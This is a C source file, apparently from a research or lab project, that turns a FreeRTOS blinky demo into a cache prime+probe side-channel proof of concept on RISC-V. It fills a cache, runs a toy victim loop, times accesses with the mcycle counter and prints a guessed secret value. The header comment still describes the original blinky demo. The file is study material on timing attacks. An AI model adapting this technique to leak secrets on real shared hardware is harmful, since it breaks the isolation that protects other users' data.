/*
 * FreeRTOS Kernel V10.2.1
 * Copyright (C) 2019 Amazon.com, Inc. or its affiliates.  All Rights Reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
 * the Software, and to permit persons to whom the Software is furnished to do so,
 * subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 * http://www.FreeRTOS.org
 * http://aws.amazon.com/freertos
 *
 * 1 tab == 4 spaces!
 */

/******************************************************************************
 * NOTE 1:  This project provides two demo applications.  A simple blinky
 * style project, and a more comprehensive test and demo application.  The
 * mainCREATE_SIMPLE_BLINKY_DEMO_ONLY setting in main.c is used to select
 * between the two.  See the notes on using mainCREATE_SIMPLE_BLINKY_DEMO_ONLY
 * in main.c.  This file implements the simply blinky style version.
 *
 * NOTE 2:  This file only contains the source code that is specific to the
 * basic demo.  Generic functions, such FreeRTOS hook functions, and functions
 * required to configure the hardware are defined in main.c.
 ******************************************************************************
 *
 * main_blinky() creates one queue, and two tasks.  It then starts the
 * scheduler.
 *
 * The Queue Send Task:
 * The queue send task is implemented by the prvQueueSendTask() function in
 * this file.  prvQueueSendTask() sits in a loop that causes it to repeatedly
 * block for 1000 milliseconds, before sending the value 100 to the queue that
 * was created within main_blinky().  Once the value is sent, the task loops
 * back around to block for another 1000 milliseconds...and so on.
 *
 * The Queue Receive Task:
 * The queue receive task is implemented by the prvQueueReceiveTask() function
 * in this file.  prvQueueReceiveTask() sits in a loop where it repeatedly
 * blocks on attempts to read data from the queue that was created within
 * main_blinky().  When data is received, the task checks the value of the
 * data, and if the value equals the expected 100, writes 'Blink' to the UART
 * (the UART is used in place of the LED to allow easy execution in QEMU).  The
 * 'block time' parameter passed to the queue receive function specifies that
 * the task should be held in the Blocked state indefinitely to wait for data to
 * be available on the queue.  The queue receive task will only leave the
 * Blocked state when the queue send task writes to the queue.  As the queue
 * send task writes to the queue every 1000 milliseconds, the queue receive
 * task leaves the Blocked state every 1000 milliseconds, and therefore toggles
 * the LED every 200 milliseconds.
 */

/* Standard includes. */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/* Kernel includes. */
#include "FreeRTOS.h"
#include "task.h"
#include "uart/uart.h"

/* Priorities used by the tasks. */
//#define mainQUEUE_RECEIVE_TASK_PRIORITY		( tskIDLE_PRIORITY + 2 )
//#define	mainQUEUE_SEND_TASK_PRIORITY		( tskIDLE_PRIORITY + 1 )

/* The rate at which data is sent to the queue.  The 200ms value is converted
to ticks using the pdMS_TO_TICKS() macro. */
//#define mainQUEUE_SEND_FREQUENCY_MS			pdMS_TO_TICKS( 10 )

//?? time delay ?? 
// #define mainQUEUE_SEND_FREQUENCY_MS			pdMS_TO_TICKS( 100 ) // 100ms - converted to 100 tick

//#define mainQUEUE_SEND_FREQUENCY_MS			pdMS_TO_TICKS( 500 ) // 100ms - converted to 100 tick

/* The maximum number items the queue can hold.  The priority of the receiving
task is above the priority of the sending task, so the receiving task will
preempt the sending task and remove the queue items each time the sending task
writes to the queue.  Therefore the queue will never have more than one item in
it at any time, and even with a queue length of 1, the sending task will never
find the queue full. */
//#define mainQUEUE_LENGTH					( 1 )

/*-----------------------------------------------------------*/

/*
 * Called by main when mainCREATE_SIMPLE_BLINKY_DEMO_ONLY is set to 1 in
 * main.c.
 */
void attack_demo( void );
extern uart_instance_t * const gp_my_uart;
extern dummyLoop();


uint64_t array[4096]; 

uint64_t temp2=0; //in prime
uint64_t temp3; //in victim process
uint64_t temp[4096];
uint64_t temp4; //in probe

/*
 * The tasks as described in the comments at the top of this file.
 */
//static void prvQueueReceiveTask( void *pvParameters );
//static void prvQueueSendTask( void *pvParameters );


static void prvAttackTask( void *pvParameters );

/*-----------------------------------------------------------*/

/* The queue used by both tasks. */
//static QueueHandle_t xQueue = NULL;

/*-----------------------------------------------------------*/
void victim_process() {  
	asm volatile ("add x0, x0, x0");

	printf( "Calling %s\n", __func__ );

// secret value is equal to the loop index ( here 14)

    for (register int j = 0; j < 14; j++) {  
       temp[2*j]=2*j+3; // the victim process evicts just one half of the Cache line for each iteration.
       temp3=temp[2*j]; 
    }
    asm volatile ("add x0, x0, x0");
}

void prime(){
	
	printf( "Calling %s\n", __func__ );
    for (register int k = 0; k<8 ; k++) {
		for (register int i = 0; i < 512; i++) {
			array[i+512*k]=100;
			temp2 = array[i+512*k];  
		}
	}

}

void probe() {
	

    //int threshold = 24; //try different range - 10/5/15/20
    //int threshold = 10; //same for 20
	int threshold = 24;
	int res;
    int secret=0;
    uint64_t addr[4096];
    uint64_t addr2[4096];
    int x=0;

	printf( "Calling %s\n", __func__ );

	for (register int l = 0; l<8 ; l++) {
		for (register int m = 0; m < 512; m++) {

				asm volatile ("csrrs x6, mcycle, x0");
				temp4 = array[m+512*l];
				asm volatile ("csrrs x7, mcycle, x0");
				asm volatile ("sub %0, x7, x6;"
					: "=r" (res));

				if (res > threshold) {
                        
                    addr[x]=  (uint64_t)(&array[m+512*l]) & 0x0000000000000ff0 ;  //extract 8 bit index   
                    x+=1;
				}
			
		}
	}

    

    
    int Size=x;
    //asm volatile ("add x0, x0, x0");

    // delete duplicate elements from addr array:
    
    for (int p = 0; p < Size; p++)
	{
		for(int q = p + 1; q < Size; q++)
		{
    		if(addr[p] == addr[q])
    		{
    			for(int k = q; k < Size; k++)
    			{
    				addr[k] = addr[k + 1];
				}
				Size--;
				q--;
			}
		}
	}

    //asm volatile ("add x0, x0, x0");
    // sort the array
    int a ;
    

    for (int i = 0; i < Size; ++i){
        for (int j = i + 1; j < Size; ++j){
            if (addr[i] > addr[j]){
                a = addr[i];
                addr[i] = addr[j];
                addr[j] = a;
            }
        }
    }
    
    


    //asm volatile ("add x0, x0, x0");

    //guess the secret
    int var;
    for (int t = 0; t < Size; t++){
        
        if (addr[t]>0xcd0){
            var=1;
        }
        if (addr[t]< 0xc50 || addr[t]>0xcd0){
            secret+=1;
        }

        if (addr[t+1]!=addr[t]+16){
            break;
        }
    }
    if (var==1){
        secret+=9;
    }
	printf("Secret Value = %d\n",secret);
   


	//For easy debugging and log-reading
	asm volatile ("add x0, x0, x0");
	asm volatile ("add x6, %0, x0;"
		:
		: "r" (secret));
	asm volatile ("add x0, x0, x0");	
    //return secret;
}
/*-----------------------------------------------------------*/

/*-----------------------------------------------------------*/

//unsigned int ulValueToSend = 0;

void attack_demo( void )
{

	printf( "\n==== Calling %s ====\n", __func__);
	
	/* Create the queue. */
	
	//printf("\n==== Creating Queue ====\n" );
	
	//xQueue = xQueueCreate( mainQUEUE_LENGTH, sizeof( uint32_t ) );

	//if( xQueue != NULL )
	//{
	 //   printf("\n==== Creating two tasks ====\n" );
		/* Start the two tasks as described in the comments at the top of this
		file. */
		//xTaskCreate( prvQueueReceiveTask,				/* The function that implements the task. */
		//			"Rx", 								/* The text name assigned to the task - for debug only as it is not used by the kernel. */
		//			configMINIMAL_STACK_SIZE * 2U, 		/* The size of the stack to allocate to the task. */
		//			NULL, 								/* The parameter passed to the task - not used in this case. */
		//			mainQUEUE_RECEIVE_TASK_PRIORITY, 	/* The priority assigned to the task. */
		//			NULL );								/* The task handle is not required, so NULL is passed. */
		
		//printf( "\n==== Created prvQueueReceveiTask ====\n");

		//xTaskCreate( prvQueueSendTask, "TX", configMINIMAL_STACK_SIZE * 2U, NULL, mainQUEUE_SEND_TASK_PRIORITY, NULL );
		printf( "\n==== Creating prvAttackTask ====\n");
		xTaskCreate( prvAttackTask, "Attack", configMINIMAL_STACK_SIZE * 2U, NULL, 1, NULL );
		printf( "\n==== Created prvAttackTask ====\n" );
		
	    printf( "Starting scheduler (vTaskStartScheduler)\n" );
		/* Start the tasks and timer running. */
		vTaskStartScheduler();
				
	//}

	/* If all is well, the scheduler will now be running, and the following
	line will never be reached.  If the following line does execute, then
	there was insufficient FreeRTOS heap memory available for the Idle and/or
	timer tasks to be created.  See the memory management section on the
	FreeRTOS web site for more details on the FreeRTOS heap
	http://www.freertos.org/a00111.html. */
	for( ;; );
}
/*-----------------------------------------------------------*/

static void prvAttackTask( void *pvParameters )
{
	/* Remove compiler warning about unused parameter. */
	( void ) pvParameters;

	prime();
	victim_process();
	probe();
}


/*-----------------------------------------------------------*/


/*-----------------------------------------------------------*/

/*-----------------------------------------------------------*/
